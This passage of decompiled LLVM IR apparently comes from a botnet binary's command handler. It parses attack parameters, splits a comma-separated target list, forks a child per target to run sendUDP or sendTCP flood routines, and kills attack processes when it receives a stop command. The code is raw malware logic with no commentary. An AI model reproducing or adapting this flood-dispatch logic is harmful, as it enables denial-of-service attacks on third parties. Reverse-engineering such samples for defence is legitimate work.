  %v5_804cdee = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804cdee, i1* %cf.global-to-local, align 1
  %v1_804cdf1 = inttoptr i32 %v1_804cdee to i32*
  %v2_804cdf1 = load i32, i32* %v1_804cdf1, align 4
  %v2_804cdf6 = call i32 @atol(i32 %v2_804cdf1)
  %v5_804cdfb = icmp ne i32 %v2_804cdf6, -1
  store i1 %v5_804cdfb, i1* %cf.global-to-local, align 1
  %v10_804cdfb = icmp eq i32 %v2_804cdf6, -1
  br i1 %v10_804cdfb, label %dec_label_pc_804d3e4, label %dec_label_pc_804ce04

dec_label_pc_804ce04:                             ; preds = %dec_label_pc_804cdeb
  store i1 %v5_804cdee, i1* %cf.global-to-local, align 1
  %v2_804ce0a = load i32, i32* %v1_804cdf1, align 4
  %v2_804ce0f = call i32 @atol(i32 %v2_804ce0a)
  %v1_804ce14 = add i32 %v2_804ce0f, -65500
  %v5_804ce14 = icmp ult i32 %v2_804ce0f, 65500
  %v6_804ce14 = sub i32 65499, %v2_804ce0f
  %v7_804ce14 = and i32 %v6_804ce14, %v2_804ce0f
  %v8_804ce14 = icmp slt i32 %v7_804ce14, 0
  store i1 %v5_804ce14, i1* %cf.global-to-local, align 1
  %v9_804ce14 = icmp eq i32 %v1_804ce14, 0
  %v10_804ce14 = icmp slt i32 %v1_804ce14, 0
  %v3_804ce19 = icmp eq i1 %v10_804ce14, %v8_804ce14
  %v4_804ce19 = icmp eq i1 %v9_804ce14, false
  %v5_804ce19 = and i1 %v4_804ce19, %v3_804ce19
  br i1 %v5_804ce19, label %dec_label_pc_804d3e4, label %dec_label_pc_804ce1f

dec_label_pc_804ce1f:                             ; preds = %dec_label_pc_804ce04
  store i1 %v2_804cdd5, i1* %cf.global-to-local, align 1
  %v2_804ce25 = load i32, i32* %v1_804cdd8, align 4
  %v2_804ce2a = call i32 @atol(i32 %v2_804ce25)
  %v1_804ce2f = add i32 %v2_804ce2a, -32
  %v2_804ce2f = icmp ult i32 %v2_804ce2a, 32
  %v3_804ce2f = sub i32 31, %v2_804ce2a
  %v4_804ce2f = and i32 %v3_804ce2f, %v2_804ce2a
  %v5_804ce2f = icmp slt i32 %v4_804ce2f, 0
  store i1 %v2_804ce2f, i1* %cf.global-to-local, align 1
  %v6_804ce2f = icmp eq i32 %v1_804ce2f, 0
  %v7_804ce2f = icmp slt i32 %v1_804ce2f, 0
  %v3_804ce32 = icmp eq i1 %v7_804ce2f, %v5_804ce2f
  %v4_804ce32 = icmp eq i1 %v6_804ce2f, false
  %v5_804ce32 = and i1 %v4_804ce32, %v3_804ce32
  br i1 %v5_804ce32, label %dec_label_pc_804d3e4, label %dec_label_pc_804ce38

dec_label_pc_804ce38:                             ; preds = %dec_label_pc_804ce1f
  %v8_804ce38 = icmp ult i32 %arg1, 7
  store i1 %v8_804ce38, i1* %cf.global-to-local, align 1
  %v12_804ce38 = icmp eq i32 %arg1, 7
  %v1_804ce3c = icmp eq i1 %v12_804ce38, false
  br i1 %v1_804ce3c, label %dec_label_pc_804ce57, label %dec_label_pc_804ce3e

dec_label_pc_804ce3e:                             ; preds = %dec_label_pc_804ce38
  %v1_804ce41 = add i32 %tmp121, 24
  %v5_804ce41 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804ce41, i1* %cf.global-to-local, align 1
  %v1_804ce44 = inttoptr i32 %v1_804ce41 to i32*
  %v2_804ce44 = load i32, i32* %v1_804ce44, align 4
  %v2_804ce49 = call i32 @atol(i32 %v2_804ce44)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp134 = icmp slt i32 %v2_804ce49, 1
  %tmp135 = icmp eq i1 %tmp134, false
  br i1 %tmp135, label %dec_label_pc_804ce57, label %dec_label_pc_804d3e4

dec_label_pc_804ce57:                             ; preds = %dec_label_pc_804ce3e, %dec_label_pc_804ce38
  %v1_804ce5a = add i32 %tmp121, 4
  %v1_804ce5d = inttoptr i32 %v1_804ce5a to i32*
  %v2_804ce5d = load i32, i32* %v1_804ce5d, align 4
  store i1 %v5_804cdbc, i1* %cf.global-to-local, align 1
  %v2_804ce68 = load i32, i32* %v1_804cdbf, align 4
  %v2_804ce6d = call i32 @atol(i32 %v2_804ce68)
  store i1 %v5_804cda3, i1* %cf.global-to-local, align 1
  %v2_804ce7b = load i32, i32* %v1_804cda6, align 4
  %v2_804ce80 = call i32 @atol(i32 %v2_804ce7b)
  store i1 %v2_804cdd5, i1* %cf.global-to-local, align 1
  %v2_804ce8e = load i32, i32* %v1_804cdd8, align 4
  %v2_804ce93 = call i32 @atol(i32 %v2_804ce8e)
  store i1 %v5_804cdee, i1* %cf.global-to-local, align 1
  %v2_804cea1 = load i32, i32* %v1_804cdf1, align 4
  %v2_804cea6 = call i32 @atol(i32 %v2_804cea1)
  store i1 %v8_804ce38, i1* %cf.global-to-local, align 1
  br i1 %v1_804ce3c, label %dec_label_pc_804ced6, label %dec_label_pc_804ceb4

dec_label_pc_804ceb4:                             ; preds = %dec_label_pc_804ce57
  %v1_804ceb7 = add i32 %tmp121, 24
  %v5_804ceb7 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804ceb7, i1* %cf.global-to-local, align 1
  %v1_804ceba = inttoptr i32 %v1_804ceb7 to i32*
  %v2_804ceba = load i32, i32* %v1_804ceba, align 4
  %v2_804cebf = call i32 @atol(i32 %v2_804ceba)
  br label %dec_label_pc_804ced6

dec_label_pc_804ced6:                             ; preds = %dec_label_pc_804ce57, %dec_label_pc_804ceb4
  %storemerge5 = phi i32 [ %v2_804cebf, %dec_label_pc_804ceb4 ], [ 10, %dec_label_pc_804ce57 ]
  store i32 %storemerge5, i32* @esi, align 4
  %v4_804ceea = inttoptr i32 %v2_804ce5d to i8*
  %v4_804ceed = call i32 @__GI_strchr(i8* %v4_804ceea, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cef2 = icmp eq i32 %v4_804ceed, 0
  br i1 %v1_804cef2, label %dec_label_pc_804cf81, label %dec_label_pc_804cefa

dec_label_pc_804cefa:                             ; preds = %dec_label_pc_804ced6
  store i32 %v2_804ce5d, i32* @eax, align 4
  %v3_804cf08 = call i32 @__GI_strtok(i32 %v2_804ce5d, i32 ptrtoint (i32* @global_var_8052eb4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cf7925 = icmp eq i32 %v3_804cf08, 0
  %v1_804cf7d32 = icmp eq i1 %v4_804cf7925, false
  br i1 %v1_804cf7d32, label %dec_label_pc_804cf12, label %dec_label_pc_804cfd5

dec_label_pc_804cf12:                             ; preds = %dec_label_pc_804cefa, %dec_label_pc_804cf62
  %storemerge1033 = phi i32 [ %v3_804cf71, %dec_label_pc_804cf62 ], [ %v3_804cf08, %dec_label_pc_804cefa ]
  %v0_804cf12 = call i32 @listFork()
  store i32 %v0_804cf12, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cf17 = icmp eq i32 %v0_804cf12, 0
  %v1_804cf19 = icmp eq i1 %v1_804cf17, false
  br i1 %v1_804cf19, label %dec_label_pc_804cf62, label %dec_label_pc_804cf1b

dec_label_pc_804cf1b:                             ; preds = %dec_label_pc_804cf12
  %v7_804cf44 = call i32 @sendUDP(i32 %storemerge1033, i32 %v2_804ce6d, i32 %v2_804ce80, i32 %v2_804ce93, i32 %v2_804cea6, i32 %storemerge5)
  %v0_804cf49 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804cf49 = ptrtoint i8* %v0_804cf49 to i32
  %v2_804cf51 = call i32 @__libc_close(i32 %v1_804cf49)
  %v2_804cf5d = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cf62:                             ; preds = %dec_label_pc_804cf12
  %v3_804cf71 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8052eb4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cf79 = icmp eq i32 %v3_804cf71, 0
  %v1_804cf7d = icmp eq i1 %v4_804cf79, false
  br i1 %v1_804cf7d, label %dec_label_pc_804cf12, label %dec_label_pc_804cfd5

dec_label_pc_804cf81:                             ; preds = %dec_label_pc_804ced6
  %v0_804cf81 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cf86 = icmp eq i32 %v0_804cf81, 0
  %v1_804cf88 = icmp eq i1 %v1_804cf86, false
  br i1 %v1_804cf88, label %dec_label_pc_804d3e4, label %dec_label_pc_804cf8e

dec_label_pc_804cf8e:                             ; preds = %dec_label_pc_804cf81
  %v7_804cfb7 = call i32 @sendUDP(i32 %v2_804ce5d, i32 %v2_804ce6d, i32 %v2_804ce80, i32 %v2_804ce93, i32 %v2_804cea6, i32 %storemerge5)
  %v0_804cfbc = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804cfbc = ptrtoint i8* %v0_804cfbc to i32
  %v2_804cfc4 = call i32 @__libc_close(i32 %v1_804cfbc)
  %v2_804cfd0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cfd5:                             ; preds = %dec_label_pc_804cf62, %dec_label_pc_804cefa, %dec_label_pc_804cd4b
  %v2_804cfd8 = load i32, i32* %arg2, align 4
  %v4_804cff5 = inttoptr i32 %v2_804cfd8 to i8*
  %v7_804d007 = call i32 @_strncmp(i8* %v4_804cff5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052f05.60, i32 0, i32 0), i32 4)
  %v8_804d007 = urem i32 %v7_804d007, 2
  %v9_804d007 = icmp eq i32 %v8_804d007, 0
  %v0_804d009 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d009 = or i1 %v0_804d009, %v9_804d007
  %v3_804d009 = zext i1 %v2_804d009 to i32
  %v4_804d009 = load i32, i32* @edx, align 4
  %v5_804d009 = and i32 %v4_804d009, -256
  %v6_804d009 = or i32 %v3_804d009, %v5_804d009
  %v7_804d009 = xor i32 %v6_804d009, 1
  store i32 %v7_804d009, i32* @edx, align 4
  %v1_804d011 = trunc i32 %v7_804d009 to i8
  %v3_804d011 = zext i1 %v0_804d009 to i8
  %v4_804d011 = sub nsw i8 %v1_804d011, %v3_804d011
  %v15_804d011 = icmp eq i8 %v4_804d011, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d01a = icmp eq i1 %v15_804d011, false
  br i1 %v1_804d01a, label %dec_label_pc_804d280, label %dec_label_pc_804d020

dec_label_pc_804d020:                             ; preds = %dec_label_pc_804cfd5
  %v2_804d015 = sext i8 %v4_804d011 to i32
  %v9_804d020 = icmp ult i32 %arg1, 5
  store i1 %v9_804d020, i1* %cf.global-to-local, align 1
  %v7_804d024 = icmp sgt i32 %arg1, 5
  br i1 %v7_804d024, label %dec_label_pc_804d02a, label %dec_label_pc_804d3e4

dec_label_pc_804d02a:                             ; preds = %dec_label_pc_804d020
  %v1_804d02d = add i32 %tmp121, 12
  %v5_804d02d = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804d02d, i1* %cf.global-to-local, align 1
  %v1_804d030 = inttoptr i32 %v1_804d02d to i32*
  %v2_804d030 = load i32, i32* %v1_804d030, align 4
  %v2_804d035 = call i32 @atol(i32 %v2_804d030)
  %v5_804d03a = icmp ne i32 %v2_804d035, -1
  store i1 %v5_804d03a, i1* %cf.global-to-local, align 1
  %v10_804d03a = icmp eq i32 %v2_804d035, -1
  br i1 %v10_804d03a, label %dec_label_pc_804d3e4, label %dec_label_pc_804d043

dec_label_pc_804d043:                             ; preds = %dec_label_pc_804d02a
  %v1_804d046 = add i32 %tmp121, 8
  %v5_804d046 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804d046, i1* %cf.global-to-local, align 1
  %v1_804d049 = inttoptr i32 %v1_804d046 to i32*
  %v2_804d049 = load i32, i32* %v1_804d049, align 4
  %v2_804d04e = call i32 @atol(i32 %v2_804d049)
  %v5_804d053 = icmp ne i32 %v2_804d04e, -1
  store i1 %v5_804d053, i1* %cf.global-to-local, align 1
  %v10_804d053 = icmp eq i32 %v2_804d04e, -1
  br i1 %v10_804d053, label %dec_label_pc_804d3e4, label %dec_label_pc_804d05c

dec_label_pc_804d05c:                             ; preds = %dec_label_pc_804d043
  %v1_804d05f = add i32 %tmp121, 16
  %v2_804d05f = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804d05f, i1* %cf.global-to-local, align 1
  %v1_804d062 = inttoptr i32 %v1_804d05f to i32*
  %v2_804d062 = load i32, i32* %v1_804d062, align 4
  %v2_804d067 = call i32 @atol(i32 %v2_804d062)
  %v5_804d06c = icmp ne i32 %v2_804d067, -1
  store i1 %v5_804d06c, i1* %cf.global-to-local, align 1
  %v10_804d06c = icmp eq i32 %v2_804d067, -1
  br i1 %v10_804d06c, label %dec_label_pc_804d3e4, label %dec_label_pc_804d075

dec_label_pc_804d075:                             ; preds = %dec_label_pc_804d05c
  store i1 %v2_804d05f, i1* %cf.global-to-local, align 1
  %v2_804d07b = load i32, i32* %v1_804d062, align 4
  %v2_804d080 = call i32 @atol(i32 %v2_804d07b)
  %v1_804d085 = add i32 %v2_804d080, -32
  %v2_804d085 = icmp ult i32 %v2_804d080, 32
  %v3_804d085 = sub i32 31, %v2_804d080
  %v4_804d085 = and i32 %v3_804d085, %v2_804d080
  %v5_804d085 = icmp slt i32 %v4_804d085, 0
  store i1 %v2_804d085, i1* %cf.global-to-local, align 1
  %v6_804d085 = icmp eq i32 %v1_804d085, 0
  %v7_804d085 = icmp slt i32 %v1_804d085, 0
  %v3_804d088 = icmp eq i1 %v7_804d085, %v5_804d085
  %v4_804d088 = icmp eq i1 %v6_804d085, false
  %v5_804d088 = and i1 %v4_804d088, %v3_804d088
  br i1 %v5_804d088, label %dec_label_pc_804d3e4, label %dec_label_pc_804d08e

dec_label_pc_804d08e:                             ; preds = %dec_label_pc_804d075
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804d092 = icmp sgt i32 %arg1, 6
  br i1 %v7_804d092, label %dec_label_pc_804d094, label %dec_label_pc_804d0ac

dec_label_pc_804d094:                             ; preds = %dec_label_pc_804d08e
  %v1_804d097 = add i32 %tmp121, 24
  %v5_804d097 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804d097, i1* %cf.global-to-local, align 1
  %v1_804d09a = inttoptr i32 %v1_804d097 to i32*
  %v2_804d09a = load i32, i32* %v1_804d09a, align 4
  %v2_804d09f = call i32 @atol(i32 %v2_804d09a)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804d0a4 = icmp slt i32 %v2_804d09f, 0
  br i1 %v2_804d0a4, label %dec_label_pc_804d3e4, label %dec_label_pc_804d0ac

dec_label_pc_804d0ac:                             ; preds = %dec_label_pc_804d08e, %dec_label_pc_804d094
  %v8_804d0ac = icmp ult i32 %arg1, 8
  store i1 %v8_804d0ac, i1* %cf.global-to-local, align 1
  %v12_804d0ac = icmp eq i32 %arg1, 8
  %v1_804d0b0 = icmp eq i1 %v12_804d0ac, false
  br i1 %v1_804d0b0, label %dec_label_pc_804d0cb, label %dec_label_pc_804d0b2

dec_label_pc_804d0b2:                             ; preds = %dec_label_pc_804d0ac
  %v1_804d0b5 = add i32 %tmp121, 28
  %v5_804d0b5 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804d0b5, i1* %cf.global-to-local, align 1
  %v1_804d0b8 = inttoptr i32 %v1_804d0b5 to i32*
  %v2_804d0b8 = load i32, i32* %v1_804d0b8, align 4
  %v2_804d0bd = call i32 @atol(i32 %v2_804d0b8)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp136 = icmp slt i32 %v2_804d0bd, 1
  %tmp137 = icmp eq i1 %tmp136, false
  br i1 %tmp137, label %dec_label_pc_804d0cb, label %dec_label_pc_804d3e4

dec_label_pc_804d0cb:                             ; preds = %dec_label_pc_804d0b2, %dec_label_pc_804d0ac
  %v1_804d0ce = add i32 %tmp121, 4
  %v1_804d0d1 = inttoptr i32 %v1_804d0ce to i32*
  %v2_804d0d1 = load i32, i32* %v1_804d0d1, align 4
  store i1 %v5_804d046, i1* %cf.global-to-local, align 1
  %v2_804d0dc = load i32, i32* %v1_804d049, align 4
  %v2_804d0e1 = call i32 @atol(i32 %v2_804d0dc)
  store i1 %v5_804d02d, i1* %cf.global-to-local, align 1
  %v2_804d0ef = load i32, i32* %v1_804d030, align 4
  %v2_804d0f4 = call i32 @atol(i32 %v2_804d0ef)
  store i1 %v2_804d05f, i1* %cf.global-to-local, align 1
  %v2_804d102 = load i32, i32* %v1_804d062, align 4
  %v2_804d107 = call i32 @atol(i32 %v2_804d102)
  %v1_804d112 = add i32 %tmp121, 20
  %v1_804d115 = inttoptr i32 %v1_804d112 to i32*
  %v2_804d115 = load i32, i32* %v1_804d115, align 4
  store i1 %v8_804d0ac, i1* %cf.global-to-local, align 1
  br i1 %v1_804d0b0, label %dec_label_pc_804d142, label %dec_label_pc_804d120

dec_label_pc_804d120:                             ; preds = %dec_label_pc_804d0cb
  %v1_804d123 = add i32 %tmp121, 28
  %v5_804d123 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804d123, i1* %cf.global-to-local, align 1
  %v1_804d126 = inttoptr i32 %v1_804d123 to i32*
  %v2_804d126 = load i32, i32* %v1_804d126, align 4
  %v2_804d12b = call i32 @atol(i32 %v2_804d126)
  br label %dec_label_pc_804d142

dec_label_pc_804d142:                             ; preds = %dec_label_pc_804d0cb, %dec_label_pc_804d120
  %storemerge3 = phi i32 [ %v2_804d12b, %dec_label_pc_804d120 ], [ 10, %dec_label_pc_804d0cb ]
  store i32 %storemerge3, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804d092, label %dec_label_pc_804d151, label %dec_label_pc_804d173

dec_label_pc_804d151:                             ; preds = %dec_label_pc_804d142
  %v1_804d154 = add i32 %tmp121, 24
  %v5_804d154 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804d154, i1* %cf.global-to-local, align 1
  %v1_804d157 = inttoptr i32 %v1_804d154 to i32*
  %v2_804d157 = load i32, i32* %v1_804d157, align 4
  %v2_804d15c = call i32 @atol(i32 %v2_804d157)
  br label %dec_label_pc_804d173

dec_label_pc_804d173:                             ; preds = %dec_label_pc_804d142, %dec_label_pc_804d151
  %storemerge2 = phi i32 [ %v2_804d15c, %dec_label_pc_804d151 ], [ 0, %dec_label_pc_804d142 ]
  store i32 %storemerge2, i32* @edi, align 4
  %v4_804d187 = inttoptr i32 %v2_804d0d1 to i8*
  %v4_804d18a = call i32 @__GI_strchr(i8* %v4_804d187, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d18f = icmp eq i32 %v4_804d18a, 0
  br i1 %v1_804d18f, label %dec_label_pc_804d225, label %dec_label_pc_804d197

dec_label_pc_804d197:                             ; preds = %dec_label_pc_804d173
  store i32 %v2_804d0d1, i32* @eax, align 4
  %v3_804d1a5 = call i32 @__GI_strtok(i32 %v2_804d0d1, i32 ptrtoint (i32* @global_var_8052eb4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d21d16 = icmp eq i32 %v3_804d1a5, 0
  %v1_804d22123 = icmp eq i1 %v4_804d21d16, false
  br i1 %v1_804d22123, label %dec_label_pc_804d1af, label %dec_label_pc_804d280

dec_label_pc_804d1af:                             ; preds = %dec_label_pc_804d197, %dec_label_pc_804d206
  %storemerge1124 = phi i32 [ %v3_804d215, %dec_label_pc_804d206 ], [ %v3_804d1a5, %dec_label_pc_804d197 ]
  %v0_804d1af = call i32 @listFork()
  store i32 %v0_804d1af, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d1b4 = icmp eq i32 %v0_804d1af, 0
  %v1_804d1b6 = icmp eq i1 %v1_804d1b4, false
  br i1 %v1_804d1b6, label %dec_label_pc_804d206, label %dec_label_pc_804d1b8

dec_label_pc_804d1b8:                             ; preds = %dec_label_pc_804d1af
  %v8_804d1e8 = inttoptr i32 %v2_804d115 to i8*
  %v9_804d1e8 = call i32 @sendTCP(i32 %storemerge1124, i32 %v2_804d0e1, i32 %v2_804d0f4, i32 %v2_804d107, i8* %v8_804d1e8, i32 %storemerge2, i32 %storemerge3)
  %v0_804d1ed = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804d1ed = ptrtoint i8* %v0_804d1ed to i32
  %v2_804d1f5 = call i32 @__libc_close(i32 %v1_804d1ed)
  %v2_804d201 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804d206:                             ; preds = %dec_label_pc_804d1af
  %v3_804d215 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8052eb4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d21d = icmp eq i32 %v3_804d215, 0
  %v1_804d221 = icmp eq i1 %v4_804d21d, false
  br i1 %v1_804d221, label %dec_label_pc_804d1af, label %dec_label_pc_804d280

dec_label_pc_804d225:                             ; preds = %dec_label_pc_804d173
  %v0_804d225 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d22a = icmp eq i32 %v0_804d225, 0
  %v1_804d22c = icmp eq i1 %v1_804d22a, false
  br i1 %v1_804d22c, label %dec_label_pc_804d3e4, label %dec_label_pc_804d232

dec_label_pc_804d232:                             ; preds = %dec_label_pc_804d225
  %v8_804d262 = inttoptr i32 %v2_804d115 to i8*
  %v9_804d262 = call i32 @sendTCP(i32 %v2_804d0d1, i32 %v2_804d0e1, i32 %v2_804d0f4, i32 %v2_804d107, i8* %v8_804d262, i32 %storemerge2, i32 %storemerge3)
  %v0_804d267 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804d267 = ptrtoint i8* %v0_804d267 to i32
  %v2_804d26f = call i32 @__libc_close(i32 %v1_804d267)
  %v2_804d27b = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804d280:                             ; preds = %dec_label_pc_804d206, %dec_label_pc_804d197, %dec_label_pc_804cfd5
  %v2_804d283 = load i32, i32* %arg2, align 4
  %v4_804d2a0 = inttoptr i32 %v2_804d283 to i8*
  %v7_804d2b2 = call i32 @_strncmp(i8* %v4_804d2a0, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8052f09.61, i32 0, i32 0), i32 9)
  %v8_804d2b2 = urem i32 %v7_804d2b2, 2
  %v9_804d2b2 = icmp eq i32 %v8_804d2b2, 0
  %v0_804d2b4 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d2b4 = or i1 %v0_804d2b4, %v9_804d2b2
  %v3_804d2b4 = zext i1 %v2_804d2b4 to i32
  %v4_804d2b4 = load i32, i32* @edx, align 4
  %v5_804d2b4 = and i32 %v4_804d2b4, -256
  %v6_804d2b4 = or i32 %v3_804d2b4, %v5_804d2b4
  %v7_804d2b4 = xor i32 %v6_804d2b4, 1
  store i32 %v7_804d2b4, i32* %edx.global-to-local, align 4
  %v1_804d2bc = trunc i32 %v7_804d2b4 to i8
  %v3_804d2bc = zext i1 %v0_804d2b4 to i8
  %v15_804d2bc = icmp eq i8 %v1_804d2bc, %v3_804d2bc
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d2c5 = icmp eq i1 %v15_804d2bc, false
  br i1 %v1_804d2c5, label %dec_label_pc_804d391, label %dec_label_pc_804d334

dec_label_pc_804d2db:                             ; preds = %dec_label_pc_804d371, %dec_label_pc_804d334
  %v2_804d2de = mul i32 %storemerge, 4
  %v9_804d2de = and i32 %storemerge, 1073741824
  %v10_804d2de = icmp ne i32 %v9_804d2de, 0
  store i32 %v2_804d2de, i32* %edx.global-to-local, align 4
  %v0_804d2e3 = load i32, i32* @global_var_805b988.30, align 8
  %v2_804d2e8 = add i32 %v0_804d2e3, %v2_804d2de
  %v1_804d2eb = inttoptr i32 %v2_804d2e8 to i32*
  %v2_804d2eb = load i32, i32* %v1_804d2eb, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d2ed = icmp eq i32 %v2_804d2eb, 0
  br i1 %v1_804d2ed, label %dec_label_pc_804d331, label %dec_label_pc_804d2f1

dec_label_pc_804d2f1:                             ; preds = %dec_label_pc_804d2db
  store i1 %v10_804d2de, i1* %cf.global-to-local, align 1
  store i32 %v2_804d2de, i32* %edx.global-to-local, align 4
  %v2_804d301 = load i32, i32* %v1_804d2eb, align 4
  store i32 %v2_804d301, i32* @ebx, align 4
  %v0_804d303 = call i32 @__libc_getpid()
  %v0_804d308 = load i32, i32* @ebx, align 4
  %v7_804d308 = icmp ult i32 %v0_804d308, %v0_804d303
  store i1 %v7_804d308, i1* %cf.global-to-local, align 1
  %v12_804d308 = icmp eq i32 %v0_804d308, %v0_804d303
  br i1 %v12_804d308, label %dec_label_pc_804d331, label %dec_label_pc_804d30c

dec_label_pc_804d30c:                             ; preds = %dec_label_pc_804d2f1
  store i1 %v10_804d2de, i1* %cf.global-to-local, align 1
  store i32 %v2_804d2de, i32* %edx.global-to-local, align 4
  %v0_804d314 = load i32, i32* @global_var_805b988.30, align 8
  %v2_804d319 = add i32 %v0_804d314, %v2_804d2de
  %v1_804d31c = inttoptr i32 %v2_804d319 to i32*
  %v2_804d31c = load i32, i32* %v1_804d31c, align 4
  %v3_804d329 = call i32 @kill(i32 %v2_804d31c, i32 9)
  %v4_804d32e = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804d331

dec_label_pc_804d331:                             ; preds = %dec_label_pc_804d2f1, %dec_label_pc_804d2db, %dec_label_pc_804d30c
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804d2db ], [ %stack_var_-28.1, %dec_label_pc_804d2f1 ], [ %v4_804d32e, %dec_label_pc_804d30c ]
  %v4_804d331 = add i32 %storemerge, 1
  br label %dec_label_pc_804d334

dec_label_pc_804d334:                             ; preds = %dec_label_pc_804d280, %dec_label_pc_804d331
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804d331 ], [ 0, %dec_label_pc_804d280 ]
  %storemerge = phi i32 [ %v4_804d331, %dec_label_pc_804d331 ], [ 0, %dec_label_pc_804d280 ]
  %v0_804d348 = load i32, i32* @global_var_8055908.28, align 8
  %v0_804d34d = load i32, i32* @global_var_805590c.29, align 4
  store i32 %v0_804d34d, i32* %edx.global-to-local, align 4
  %v10_804d365 = icmp ne i32 %v0_804d34d, 0
  store i1 %v10_804d365, i1* %cf.global-to-local, align 1
  br i1 %v10_804d365, label %dec_label_pc_804d2db, label %dec_label_pc_804d371

dec_label_pc_804d371:                             ; preds = %dec_label_pc_804d334
  %v10_804d385 = icmp ult i32 %storemerge, %v0_804d348
  store i1 %v10_804d385, i1* %cf.global-to-local, align 1
  br i1 %v10_804d385, label %dec_label_pc_804d2db, label %dec_label_pc_804d391

dec_label_pc_804d391:                             ; preds = %dec_label_pc_804d371, %dec_label_pc_804d280
  %v2_804d394 = load i32, i32* %arg2, align 4
  %v4_804d3b1 = inttoptr i32 %v2_804d394 to i8*
  store i32 ptrtoint ([10 x i8]* @global_var_8052f12.62 to i32), i32* @edi, align 4
  %v7_804d3c3 = call i32 @_strncmp(i8* %v4_804d3b1, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8052f12.62, i32 0, i32 0), i32 10)
  %v8_804d3c3 = urem i32 %v7_804d3c3, 2
  %v9_804d3c3 = icmp eq i32 %v8_804d3c3, 0
  %v0_804d3c5 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d3c5 = or i1 %v0_804d3c5, %v9_804d3c3
  %v3_804d3c5 = zext i1 %v2_804d3c5 to i32
  %v4_804d3c5 = load i32, i32* %edx.global-to-local, align 4
  %v5_804d3c5 = and i32 %v4_804d3c5, -256
  %v6_804d3c5 = or i32 %v3_804d3c5, %v5_804d3c5
  %v7_804d3c5 = xor i32 %v6_804d3c5, 1
  store i32 %v7_804d3c5, i32* %edx.global-to-local, align 4
  %v1_804d3cd = trunc i32 %v7_804d3c5 to i8
  %v3_804d3cd = zext i1 %v0_804d3c5 to i8
  %v4_804d3cd = sub nsw i8 %v1_804d3cd, %v3_804d3cd
  %v15_804d3cd = icmp eq i8 %v4_804d3cd, 0
  %v2_804d3d1 = sext i8 %v4_804d3cd to i32
  store i32 %v2_804d3d1, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d3d6 = icmp eq i1 %v15_804d3cd, false
  br i1 %v1_804d3d6, label %dec_label_pc_804d3e4, label %dec_label_pc_804d3d8

dec_label_pc_804d3d8:                             ; preds = %dec_label_pc_804d391
  %v2_804d3df = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804d3e4

dec_label_pc_804d3e4:                             ; preds = %dec_label_pc_804d0b2, %dec_label_pc_804ce3e, %dec_label_pc_804cc39, %dec_label_pc_804caba, %dec_label_pc_804d020, %dec_label_pc_804cd96, %dec_label_pc_804cc17, %dec_label_pc_804ca98, %dec_label_pc_804d391, %dec_label_pc_804d225, %dec_label_pc_804d094, %dec_label_pc_804d075, %dec_label_pc_804d05c, %dec_label_pc_804d043, %dec_label_pc_804d02a, %dec_label_pc_804cf81, %dec_label_pc_804ce1f, %dec_label_pc_804ce04, %dec_label_pc_804cdeb, %dec_label_pc_804cdd2, %dec_label_pc_804cdb9, %dec_label_pc_804cda0, %dec_label_pc_804cd0c, %dec_label_pc_804cc21, %dec_label_pc_804cb8d, %dec_label_pc_804caa2, %dec_label_pc_804ca21, %dec_label_pc_804c9c0, %dec_label_pc_804d3d8
